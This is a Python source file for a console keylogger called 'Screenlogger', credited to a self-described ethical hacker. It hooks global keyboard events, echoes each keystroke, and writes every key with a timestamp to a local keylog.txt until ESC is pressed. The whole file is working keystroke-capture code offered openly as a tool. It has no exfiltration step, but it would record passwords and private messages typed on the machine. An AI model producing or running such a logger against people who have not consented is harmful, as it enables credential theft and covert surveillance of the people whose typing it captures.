import keyboard
import datetime
import os

def display_banner():
    banner = """
    ╔════════════════════════════════════════════════════╗
    ║                                                    ║
    ║          Screenlogger - Console Keylogger           ║
    ║                                                    ║
    ║    Coded by Pakistani Ethical Hacker:               ║
    ║            Mr. Sabaz Ali Khan                      ║
    ║                                                    ║
    ╚════════════════════════════════════════════════════╝
    """
    print(banner)
    print("Starting keylogger... Press ESC to stop.\n")

def log_keys():
    log_file = "keylog.txt"
    
    # Create or append to log file
    def write_to_file(key):
        with open(log_file, "a") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] {key}\n")
    
    # Display banner
    display_banner()
    
    # Start logging keys
    while True:
        try:
            event = keyboard.read_event()
            if event.event_type == keyboard.KEY_DOWN:
                key = event.name
                
                # Stop keylogger on ESC key
                if key == "esc":
                    print("\nKeylogger stopped.")
                    break
                
                # Handle special keys
                if len(key) > 1:
                    if key == "space":
                        key = " "
                    elif key == "enter":
                        key = "[ENTER]\n"
                    elif key == "backspace":
                        key = "[BACKSPACE]"
                    else:
                        key = f"[{key.upper()}]"
                
                print(key, end="", flush=True)
                write_to_file(key)
                
        except Exception as e:
            print(f"\nError: {e}")
            break

if __name__ == "__main__":
    try:
        log_keys()
    except KeyboardInterrupt:
        print("\nProgram terminated by user.")